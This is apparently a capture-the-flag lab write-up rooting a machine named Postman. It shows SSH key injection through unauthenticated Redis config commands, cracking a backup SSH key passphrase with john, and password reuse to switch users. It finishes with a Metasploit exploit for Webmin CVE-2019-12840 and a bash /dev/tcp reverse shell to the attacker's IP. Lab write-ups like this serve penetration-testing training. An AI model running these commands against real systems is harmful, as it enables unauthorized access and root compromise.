![Logo](Images/Logo.png)

# Attack Chain

```
Enumeration → 6379/Redis 4.0.9  10000/Webmin 1.910
└─ Redis unauth, MODULE disabled → SSH key injection via config set dir /var/lib/redis/.ssh
   └─ ssh redis@target → shell as redis
      └─ ssh private key backup → ssh2john + john → extract passphrase
         └─ su Matt (password reuse) → shell as Matt (user.txt)
            └─ Webmin login → CVE-2019-12840 package-updates RCE
               └─ webmin_packageup_rce → Webmin runs as root → root.txt
```

# Sommaire
---
- [Enumeration](#enumeration)
- [Website - Port 80](#website---port-80)
- [Webmin - Port 10000](#webmin---port-10000)
- [Redis](#redis)
	- [Redis exploit](#redis-exploit)
	- [SSH key Injection](#ssh-key-injection)
	- [Shell as Redis](#shell-as-redis)
- [Lateral Movement](#lateral-movement)
	- [Backup private SSH key](#backup-private-ssh-key)
	- [Crack SSH key password](#crack-ssh-key-password)
	- [Shell as Matt](#shell-as-matt)
- [Privilege Escalation](#privilege-escalation)
	- [Webmin](#webmin)
	- [Metasploit module](#metasploit-module)

---
# Enumeration
---

Let's start by scanning the target for open ports.

```
nmap -sVC 10.129.*.* -p-     
Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-29 06:36 EDT
Nmap scan report for 10.129.*.*
Host is up (0.052s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46834ff13861c01c74cbb5d14a684d77 (RSA)
|   256 2d8d27d2df151a315305fbfff0622689 (ECDSA)
|_  256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.910
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.68 seconds
```


# Website - Port 80
---

Let's check the website on port 80 to see what we find.

![Website](Images/Website.png)

We have a personal website, and there is not much we can do or interact.

Let's fuzz the directories with `ffuf`.

```
ffuf -c -w `fzf-wordlists` -u "http://10.129.*.*/FUZZ"   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.*.*/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd         [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 3829ms]
.htaccess         [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 3829ms]
css               [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 32ms]
fonts             [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 31ms]
images            [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 35ms]
js                [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 36ms]
server-status     [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 32ms]
upload            [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 34ms]
```

We found a directory `/upload` that might be interesting.

![Upload directory listing](Images/Upload%20directory%20listing.png)

We have directory listing but there is nothing that can be exploited. 

# Webmin - Port 10000
---

Let's move on the Webmin server on port 10000.

![Webmin](Images/Webmin.png)

We need to authenticate to access the server which we do not have.

# Redis
---
### Redis exploit
---
The version 4.0.9 of Redis is vulnerable and leads to an RCE. Let's try to exploit it.

First we clone the following repository to our machine.

```
git clone https://github.com/n0b0dyCN/redis-rogue-server
```

```
python3 redis-rogue-server.py --rhost 10.129.*.* --lhost 10.10.*.*
 
@copyright n0b0dy @ r3kapig

[info] TARGET 127.0.0.1:6379
[info] SERVER 127.0.0.1:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.
[<<] whoami
[<<] ls
[<<]
```

The exploit appears to not work since we do not have any output to our commands. 

Let's connect to the target redis and try to do it manually.

```
redis-cli -h 10.129.*.*

10.129.5.233:6379> MODULE LOAD exp.so
(error) ERR unknown command 'MODULE'
```

The MODULE command has been disabled, that's why our script didn't work. 
We must find another way to get a foothold on the system.

### SSH key Injection
---
I found several technique on google referencing path to exploit Redis. Let's try to inject our ssh key inside the home directory of the redis user by following the tutorial [here]([https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html](https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html#ssh)).

First we need to know the path, which could be find by using the command `CONFIG GET *`.

```
redis-cli -h 10.129.*.* CONFIG GET *

<SNIP>

var/lib/redis

<SNIP>
```

The home directory is the default one of the redis user `/var/lib/redis/`.

Let' create an ssh key now and craft it so it match the required format.

```
ssh-keygen -t rsa -b 4096
```

```
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > redis.txt
```

Now let's inject the key inside Redis

```
cat redis.txt | redis-cli -h 10.129.*.* -x set ssh_key
OK
```

Next we need to specify the directory and the name of the file where we want to put our public key.

```
redis-cli -h 10.129.*.*

10.129.5.233:6379> config set dir /var/lib/redis/.ssh
OK

10.129.5.233:6379> config set dbfilename "authorized_keys"
OK

10.129.5.233:6379> save
OK
```

### Shell as Redis
---
We can now try to connect over SSH to see if it worked.

```
chmod 600 id_rsa
```

```
ssh -i id_rsa redis@10.129.*.*

redis@Postman:~$
```

We have a shell as the user `redis`.

# Lateral Movement
---

We got a foothold on the target, let's see if we can find a way to pivot to another user from here.

### Backup private SSH key
---
Under `/opt`, there is a private ssh key with the `.bak` extension meaning that it's probably a backup or an older file. Let's retrieve it to our machine.

```
redis@Postman:~$ cd /opt
redis@Postman:/opt$ ls
id_rsa.bak
```

We can also list users in the home directory in order to guess to which user it might belong.

```
redis@Postman:~$ ls /home

Matt
```

There is only one user, `Matt`, so maybe the key belongs to him.

### Crack SSH key password
---
We paste the content of the backup key into a local file.

```
echo '<id_rsa.bak>' > id_rsa_Matt
```

The key is encrypted with a password, we can attempt to crack it with `ssh2john`.

```
ssh2john.py id_rsa_Matt > hash  
```
 
```
john hash        

<SNIP>

computer2008     (id_rsa_Matt)     
```

We got the password `computer2008`.

### Shell as Matt
---
Let's try to connect to the target over SSH with the password previously retrieved.

```
ssh -i id_rsa_Matt matt@10.129.*.*

Enter passphrase for key 'id_rsa_Matt': 
Connection closed by 10.129.*.* port 22
```

The ssh key with the password appears to be valid since we do not have errors, but the connection close instantly meaning that our user probably can't connect over SSH because our user is denied in `sshd_config`.

We can try to see if the password has been reused, like it's own password on the target

```
redis@Postman:/opt$ su Matt
Password: computer2008

Matt@Postman:~$
```

The password has been reused and we are connected as `Matt`. We can get the `user.txt` from here.

# Privilege Escalation
---

We successfuly pivoted to another user. Now we need to find a way to gain root privileges on the target.

### Webmin
---
Since we let the Webmin server behind, it might be the time to return to it and try the credentials we have for Matt.

![Webmin - Authenticated](Images/Webmin%20-%20Authenticated.png)

It worked too, and we are connected to the Webmin server.

From the `nmap` scan and some research, we know that the version 1.910 of Webmin is vulnerable to [CVE-2019-12840](https://nvd.nist.gov/vuln/detail/CVE-2019-12840).

### Metasploit module
---
There is a module on **Metasploit** that automates the process, let's use it.

```
msfconsole -q

use linux/http/webmin_packageup_rce
```

Now we config the options to match our target and we run the exploit.

```
set USERNAME Matt
set PASSWORD computer2008
set LHOST tun0
set SSL true
run

[*] Started reverse TCP handler on 10.10.*.*:4444 
[+] Session cookie: 569e33f066e0c45a8f03a188f3d3e728
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.*.*:4444 -> 10.129.*.*:35198) at 2026-05-29 10:50:54 -0400
id

uid=0(root) gid=0(root) groups=0(root)
```

The shell we received is not very responsive nor stable, let's send a reverse shell inside to stabilize it.

```
bash -c 'bash -i >& /dev/tcp/10.10.*.*/443 0>&1'
```

```
penelope -i tun0 -p 443 
[+] Listening for reverse shells on 10.10.*.*:443 
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from Postman~10.129.*.*-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /root/.penelope/sessions/Postman~10.129.*.*-Linux-x86_64/2026_05_29-10_52_20-344.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@Postman:/usr/share/webmin/package-updates/#
```

Machine rooted.